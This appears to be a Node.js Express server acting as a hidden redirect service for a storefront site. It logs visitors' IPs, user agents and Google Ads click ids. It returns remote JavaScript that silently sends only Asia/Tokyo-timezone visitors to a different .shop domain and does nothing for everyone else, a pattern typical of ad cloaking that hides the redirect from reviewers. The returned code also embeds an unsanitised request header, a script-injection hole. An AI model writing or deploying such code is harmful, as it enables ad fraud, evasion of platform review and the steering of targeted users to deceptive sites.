import express from "express";

const app = express();

const FINAL_REDIRECT_URL = "https://fooidemix.shop/map/latest";
const JAPAN_TIMEZONE = "Asia/Tokyo";

// ✅ Required for cross-origin fetch
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://refliefcart.shop");
  res.setHeader("Access-Control-Allow-Headers", "x-client-timezone");
  res.setHeader("Access-Control-Allow-Methods", "GET");
  next();
});

app.get("/getData", (req, res) => {
  const gclid = req.query.gclid || "";
  const timezone = req.headers["x-client-timezone"] || "";

  console.log({
    gclid,
    timezone,
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
    ua: req.headers["user-agent"],
    time: new Date().toISOString()
  });

  // 🚫 Not Japan → no redirect
  if (timezone !== JAPAN_TIMEZONE) {
    return res.json({
      code: `console.log("No redirect: timezone =", "${timezone}");`
    });
  }

  // ✅ Japan → redirect
  const redirectUrl = gclid
    ? `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`
    : FINAL_REDIRECT_URL;

  return res.json({
    code: `window.location.replace("${redirectUrl}");`
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
